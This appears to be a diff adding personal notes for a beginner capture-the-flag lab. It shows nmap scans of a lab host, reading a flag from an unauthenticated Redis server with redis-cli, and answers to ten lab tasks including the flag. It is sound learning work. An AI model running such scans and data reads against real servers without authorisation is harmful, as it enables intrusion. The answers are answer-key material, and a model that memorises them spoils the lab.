@@ -1,0 +1,126 @@
+PING 10.129.73.11 (10.129.73.11) 56(84) bytes of data.
+64 bytes from 10.129.73.11: icmp_seq=1 ttl=63 time=28.9 ms
+64 bytes from 10.129.73.11: icmp_seq=2 ttl=63 time=30.2 ms
+64 bytes from 10.129.73.11: icmp_seq=3 ttl=63 time=21.0 ms
+64 bytes from 10.129.73.11: icmp_seq=4 ttl=63 time=26.7 ms
+64 bytes from 10.129.73.11: icmp_seq=5 ttl=63 time=22.6 ms
+64 bytes from 10.129.73.11: icmp_seq=6 ttl=63 time=28.9 ms
+^C
+--- 10.129.73.11 ping statistics ---
+6 packets transmitted, 6 received, 0% packet loss, time 5009ms
+rtt min/avg/max/mdev = 20.990/26.380/30.227/3.437 ms
+                                                                                                                                                                                              
+┌──(root㉿kali)-[~/Downloads]
+└─# nmap -p -1,1000  10.129.73.11 #-p is the switch for scanning ports -1,1000 defines the range of ports to scan. 
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-19 23:35 BST
+Nmap scan report for 10.129.73.11
+Host is up (0.029s latency).
+
+PORT     STATE  SERVICE
+1/tcp    closed tcpmux
+1000/tcp closed cadlock
+
+Nmap done: 1 IP address (1 host up) scanned in 0.28 seconds
+                                                             
+nmap -p- 10.129.73.11 # scans all ports but takes time to complete. -min-rate 5000' or '-T5' to speed it up.
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-19 23:44 BST
+Nmap scan report for 10.129.73.11
+Host is up (0.057s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT     STATE SERVICE
+6379/tcp open  redis
+
+Nmap done: 1 IP address (1 host up) scanned in 26.60 seconds
+                                                             
+
+keys *
+10.129.73.11:6379> get flag
+"03e1d2b376c37ab3f5319922053953eb"
+
+
+
+TASK 1
+
+Which TCP port is open on the machine?
+
+6379
+
+
+
+TASK 2
+
+Which service is running on the port that is open on the machine?
+
+redis
+
+
+
+TASK 3
+
+What type of database is Redis? Choose from the following options: (i) In-memory Database, (ii) Traditional Database
+
+in-memory database
+
+
+
+TASK 4
+
+Which command-line utility is used to interact with the Redis server? Enter the program name you would enter into the terminal without any arguments.
+
+redis-cli
+
+
+
+TASK 5
+
+Which flag is used with the Redis command-line utility to specify the hostname?
+
+-h
+
+
+
+TASK 6
+
+Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server?
+
+info 
+
+
+
+TASK 7
+
+What is the version of the Redis server being used on the target machine?
+
+5.0.7
+
+
+
+TASK 8
+
+Which command is used to select the desired database in Redis?
+
+select
+
+
+
+TASK 9
+
+How many keys are present inside the database with index 0?
+
+4
+
+
+
+TASK 10
+
+Which command is used to obtain all the keys in a database?
+
+keys *
+
+
+
+SUBMIT FLAG
+
+Submit root flag
+03e1d2b376c37ab3f5319922053953eb
